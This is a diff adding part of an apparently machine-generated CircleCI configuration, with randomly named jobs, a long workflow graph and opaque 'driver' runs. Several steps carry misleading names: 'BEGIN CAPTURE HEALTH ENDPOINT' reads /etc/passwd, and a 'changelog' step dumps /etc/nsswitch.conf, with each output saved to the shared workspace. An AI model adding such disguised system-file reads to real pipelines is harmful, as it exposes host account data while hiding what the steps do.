+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  MeshHeight:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Migrate the changelog into staging
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; grep -v -H -s '^#' /etc/nsswitch.conf | sort | uniq -c; true ; } > /tmp/top/171.96
+            ( wc -c /tmp/top/171.96 ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - '171.96'
+  tb-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/171.96 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  lowerHotMotorClampGlobeBlock:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: We might archive the support macros
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; echo x >'/tmp/off1-v3.txt' && ln -f '/tmp/off1-v3.txt' "/tmp/th0.copy" && stat -c %h '/tmp/off1-v3.txt'; true ; } > /tmp/top/rev-v1.10.32
+            ( wc -c /tmp/top/rev-v1.10.32 ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'rev-v1.10.32'
+  nightly-v8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/rev-v1.10.32 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  postSidebarById:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Close the ledger day 4
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; if [ -c /dev/null ]; then echo 'it is there'; elif [ -e /tmp ]; then echo maybe; else echo 'nope'; fi; true ; } > /tmp/top/debug_20240322
+            ( wc -c /tmp/top/debug_20240322 ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'debug_20240322'
+  package:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/debug_20240322 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  vs9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: BEGIN CAPTURE HEALTH ENDPOINT
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; cat /etc/passwd|tr ':' ' '|fold -w 37; true ; } > /tmp/top/draft-fb077c4b
+            ( wc -c /tmp/top/draft-fb077c4b ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'draft-fb077c4b'
+  india-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/draft-fb077c4b 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+
+workflows:
+  default:
+    jobs:
+      - vs9
+      - india-3:
+          requires:
+            - vs9
+      - yuio:
+          requires:
+            - vs9
+      - min-ship:
+          requires:
+            - yuio
+      - tel_rv:
+          requires:
+            - yuio
+      - dp-old:
+          requires:
+            - tel_rv
+      - Read-ScannerPath:
+          requires:
+            - tel_rv
+      - luna-build:
+          requires:
+            - Read-ScannerPath
+      - postSidebarById:
+          requires:
+            - Read-ScannerPath
+      - package:
+          requires:
+            - postSidebarById
+      - dev28-ap:
+          requires:
+            - postSidebarById
+      - node20-bench:
+          requires:
+            - dev28-ap
+      - lowerHotMotorClampGlobeBlock:
+          requires:
+            - dev28-ap
+      - nightly-v8:
+          requires:
+            - lowerHotMotorClampGlobeBlock
+      - MAT2
+      - cb_dec
+      - sys_ReceiveWake
+      - py310-cov:
+          requires:
+            - MAT2
+            - cb_dec
+            - sys_ReceiveWake
+      - assemble-partial-regression-suite:
+          requires:
+            - MAT2
+            - cb_dec
+            - sys_ReceiveWake
+      - callisto-final:
+          requires:
+            - MAT2
+            - cb_dec
+            - sys_ReceiveWake
+      - INFRA-323:
+          requires:
+            - MAT2
+            - cb_dec
+            - sys_ReceiveWake
+      - titan-final:
+          requires:
+            - MAT2
+            - cb_dec
+            - sys_ReceiveWake
+      - bug-9730:
+          requires:
+            - MAT2
+            - cb_dec
+            - sys_ReceiveWake
+      - titan2-plus:
+          requires:
+            - MAT2
+            - cb_dec
+            - sys_ReceiveWake
+      - perseus-v2:
+          requires:
+            - MAT2
+            - cb_dec
+            - sys_ReceiveWake
+      - apr11-release:
+          requires:
+            - MAT2
+            - cb_dec
+            - sys_ReceiveWake
+      - hyperion-v2:
+          requires:
+            - MAT2
+            - cb_dec
+            - sys_ReceiveWake
+      - perseus-plus:
+          requires:
+            - MAT2
+            - cb_dec
+            - sys_ReceiveWake
+      - alicetron
+      - check-full-docker-image:
+          requires:
+            - alicetron
+      - uvt:
+          requires:
+            - alicetron
+      - add-router-glitch:
+          requires:
+            - uvt
+      - err:
+          requires:
+            - uvt
+      - add-queue-redirect:
+          requires:
+            - err
+      - v:
+          requires:
+            - err
+      - py310-lint:
+          requires:
+            - v
+      - asc_051DF0:
+          requires:
+            - v
+      - intergration:
+          requires:
+            - asc_051DF0
+      - UnbufferedInterfaceDriver:
+          requires:
+            - asc_051DF0
+      - INFRA-210:
+          requires:
+            - UnbufferedInterfaceDriver
+      - ITEM_202606:
+          requires:
+            - UnbufferedInterfaceDriver
+      - orion-final:
+          requires:
+            - ITEM_202606
+      - address_v2:
+          requires:
+            - ITEM_202606
+      - zulu:
+          requires:
+            - address_v2
+      - DEEP_BUCKET_SETTINGS:
+          requires:
+            - address_v2
+      - rm-login:
+          requires:
+            - DEEP_BUCKET_SETTINGS
+      - MeshHeight:
+          requires:
+            - DEEP_BUCKET_SETTINGS
+      - tb-old:
+          requires:
+            - MeshHeight
+      - skoundquamtee-kit:
+          requires:
+            - MeshHeight
+      - yankee:
+          requires:
+            - skoundquamtee-kit
+      - a2ad8c6:
+          requires:
+            - skoundquamtee-kit
+      - tb-new:
+          requires:
+            - a2ad8c6
